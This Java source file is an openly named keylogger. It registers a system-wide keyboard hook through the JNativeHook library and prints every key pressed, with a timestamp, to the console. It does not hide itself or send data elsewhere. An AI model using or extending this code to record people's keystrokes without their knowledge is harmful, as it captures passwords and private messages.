package com.keylogg;
// --------- LIBRARY IMPORTS ---------
import com.github.kwhat.jnativehook.GlobalScreen;
import com.github.kwhat.jnativehook.NativeHookException;
import com.github.kwhat.jnativehook.keyboard.NativeKeyEvent;
import com.github.kwhat.jnativehook.keyboard.NativeKeyListener;
// --------- OTHER IMPORTS ---------
import java.time.LocalDateTime;
import java.time.format.DateTimeFormatter;

// --------- CLASS ---------
public class keylogger implements NativeKeyListener {
    // --------- EXPORT KEY ---------
    @Override
    public void nativeKeyPressed(NativeKeyEvent e){
        DateTimeFormatter initTime = DateTimeFormatter.ofPattern("yyyy/MM/dd HH:mm:ss");
        LocalDateTime now = LocalDateTime.now();
        System.out.println("TIME : "+initTime.format(now)+ " || KEY PRESSED : "+NativeKeyEvent.getKeyText(e.getKeyCode()));
    }
// --------- MAIN ---------
    public static void main(String[] args) {
        try {
            GlobalScreen.registerNativeHook();
        }catch (NativeHookException e){
            e.printStackTrace();
        }
        GlobalScreen.addNativeKeyListener(new keylogger());
    }
}
